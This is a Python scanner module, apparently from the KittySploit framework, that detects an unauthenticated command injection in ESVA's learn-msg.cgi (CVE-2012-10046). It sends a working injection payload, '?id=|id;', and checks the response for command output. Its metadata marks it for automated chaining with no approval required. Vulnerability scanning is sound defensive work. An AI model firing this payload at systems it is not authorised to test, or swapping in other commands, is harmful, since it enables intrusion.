#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ESVA learn-msg.cgi command injection (CVE-2012-10046)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'ESVA - learn-msg.cgi RCE Detection (CVE-2012-10046)',
        'description': (
            'Detects CVE-2012-10046 by requesting /cgi-bin/learn-msg.cgi?id=|id; '
            'after fingerprinting released.html.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2012', 'esva', 'rce', 'cmdi', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'rce', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2012-10046',
        ],
        'cve': 'CVE-2012-10046',
    }

    def run(self):
        path = '/cgi-bin/learn-msg.cgi?id=|id;'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if r and re.search(r'uid=\d+.*gid=\d+', r.text or ''):
            self.set_info(
                severity='critical',
                reason='ESVA learn-msg.cgi RCE (CVE-2012-10046)',
                path='/cgi-bin/learn-msg.cgi',
            )
            return True
        return False
